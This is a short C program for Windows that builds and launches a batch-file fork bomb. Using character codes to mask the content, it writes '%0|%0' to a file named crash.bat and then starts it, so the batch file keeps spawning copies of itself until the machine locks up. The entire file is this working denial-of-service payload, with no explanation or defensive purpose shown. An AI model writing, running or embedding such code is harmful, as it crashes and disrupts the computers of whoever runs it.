#include <stdio.h>
#include <windows.h>

int main(){

FILE * yeet;
yeet = fopen("crash.bat","w+");
fputc(37,yeet);
fprintf(yeet,"0");
fputc(124,yeet);
fputc(37,yeet);
fprintf(yeet,"0");
fclose(yeet);
system("START crash.bat");
}
